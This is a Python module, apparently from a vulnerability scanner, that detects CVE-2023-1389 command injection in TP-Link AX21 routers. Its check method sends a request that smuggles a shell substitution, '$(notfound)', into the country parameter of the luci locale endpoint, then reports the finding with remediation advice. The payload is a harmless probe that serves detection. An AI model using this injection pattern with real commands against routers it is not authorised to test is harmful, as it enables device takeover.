"""Agent Asteroid implementation for CVE-2023-1389"""

import requests
from ostorlab.agent.kb import kb
from ostorlab.agent.mixins import agent_report_vulnerability_mixin
from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = "Remote Code Execution in TP-Link AX21"
VULNERABILITY_REFERENCE = "CVE-2023-1389"
VULNERABILITY_DESCRIPTION = (
    "TP-Link AX21 suffers from Remote Code Execution (RCE) vulnerability. The vulnerability"
    " has been added to the Mirai botnet Arsenal and is actively being targeted by threat actors"
    " in the wild."
)


DEFAULT_TIMEOUT = 90
MAX_REDIRECTS = 2


@exploits_registry.register
class CVE20231389Exploit(definitions.Exploit):
    """CVE-2023-1389: Remote Code Execution in TP-Link AX21."""

    def accept(self, target: definitions.Target) -> bool:
        session = requests.Session()
        session.max_redirects = MAX_REDIRECTS
        session.verify = False
        target_uri = f"{target.origin}/cgi-bin/luci/"
        try:
            response = session.get(target_uri, timeout=DEFAULT_TIMEOUT)
            return response.status_code == 200
        except requests_exceptions.RequestException:
            return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        session = requests.Session()
        session.max_redirects = MAX_REDIRECTS
        session.verify = False
        try:
            response = session.get(
                target.origin
                + "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(notfound)",
                timeout=DEFAULT_TIMEOUT,
            )
            # TODO(OS-6117): Approximate check that needs a live instance to validate the issue.
            if response.status_code == 500:
                vulnerability = self._generate_vulnerability_object(target.origin)
                return [vulnerability]
        except requests_exceptions.RequestException:
            return []

        return []

    def _generate_vulnerability_object(
        self, target_uri: str
    ) -> definitions.Vulnerability:
        entry = kb.Entry(
            title=VULNERABILITY_TITLE,
            risk_rating="CRITICAL",
            short_description=VULNERABILITY_DESCRIPTION,
            description=VULNERABILITY_DESCRIPTION,
            references={
                "nvd.nist.gov": f"https://nvd.nist.gov/vuln/detail/{VULNERABILITY_REFERENCE}",
                "TP-Link Advisory": "https://www.tp-link.com/us/support/faq/3643/",
                "Exploit Write-Up": "https://voyag3r-security.medium.com/exploring-cve-2023-1389"
                "-rce-in-tp-link-archer-ax21-d7a60f259e94",
            },
            recommendation=(
                "- Make sure to install the latest security patches from software vendor \n"
                "- Update to the latest software version"
            ),
            security_issue=True,
            privacy_issue=False,
            has_public_exploit=True,
            targeted_by_malware=True,
            targeted_by_ransomware=True,
            targeted_by_nation_state=True,
        )
        technical_detail = (
            f"{target_uri} is vulnerable to {VULNERABILITY_REFERENCE},"
            f" {VULNERABILITY_TITLE}."
        )
        vulnerability = definitions.Vulnerability(
            entry=entry,
            technical_detail=technical_detail,
            risk_rating=agent_report_vulnerability_mixin.RiskRating.POTENTIALLY,
        )
        return vulnerability
